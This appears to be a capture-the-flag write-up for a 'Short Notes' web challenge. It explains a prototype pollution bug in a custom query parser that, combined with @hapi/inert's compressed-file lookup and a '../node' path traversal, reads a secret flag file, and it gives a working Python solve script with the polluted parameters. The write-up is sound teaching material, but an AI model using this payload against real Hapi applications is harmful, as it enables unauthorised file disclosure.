# Short Notes (63 Solves)

## Description
A simple note-taking application that allows users to create and retrieve short notes. The challenge involves exploiting a prototype pollution vulnerability in the custom query parser and a path traversal to read the flag.

## Vulnerability
The application uses a custom query string parser `parseQuery` which is vulnerable to prototype pollution. It doesn't check for keys like `__proto__`.

```javascript
function parseQuery(qs = '') {
  const out = {};
  for (const pair of qs.split('&')) {
    // ...
    const parts = k.split(/\[|\]/).filter(Boolean);
    let cur = out;
    for (let i = 0; i < parts.length - 1; i++) {
      cur = cur[parts[i]] = cur[parts[i]] || {};
    }
    cur[parts.at(-1)] = v;
  }
  return out;
}
```

By polluting the prototype, we can influence the behavior of the `@hapi/inert` plugin, which is used to serve files. Specifically, we can control internal properties used by `inert` for file lookups and compression.

The `h.file()` method in Hapi/Inert can be tricked into reading files outside the intended directory if we can bypass the `confine` check or use other internal flags.

The solve script uses prototype pollution to set `lookupCompressed` to `true` and `lookupMap[identity]` to a path that traverses to the flag. This works because when `lookupCompressed` is enabled, `inert` tries to find a pre-compressed version of the file by concatenating the original path with an extension from the `lookupMap`.

### The Payload Strategy

1. **`../node`**: By using a note title like `../node`, we escape the random store directory. Since `h.file()` is called with `confine: false`, `inert` will resolve this path relative to the process's working directory.
2. **`lookupCompressed` and `lookupMap`**: We pollute `Object.prototype` to enable pre-compressed file lookups. We set the `identity` encoding (which means no compression) to point to our traversal payload.
3. **`-compile-cache`**: The `inert` logic performs a simple string concatenation: `finalPath = sourcePath + extension`. By setting the "extension" to `-compile-cache/../../../../../secrets/super_secret_flag.txt`, the resulting path becomes `/app/node-compile-cache/../../../.../secrets/super_secret_flag.txt`. 

The `-compile-cache` string ensures the first part of the concatenated path matches a directory prefix that likely exists on the system before the `../` sequences traverse up to the root to read the flag.


## Solve Script

```python
import os
import requests

TARGET = os.environ.get("TARGET", "http://localhost:3000")

r = requests.post(f"{TARGET}/notes", json={"title": "../node", "content": "test"})

r = requests.get(f"{TARGET}/note/..%2fnode", params={
    "__proto__[lookupCompressed]": "true",
    "__proto__[lookupMap][identity]": "-compile-cache/../../../../../secrets/super_secret_flag.txt"   
}, headers={
    "Accept-Encoding": "identity",
})

print(r.text)
```
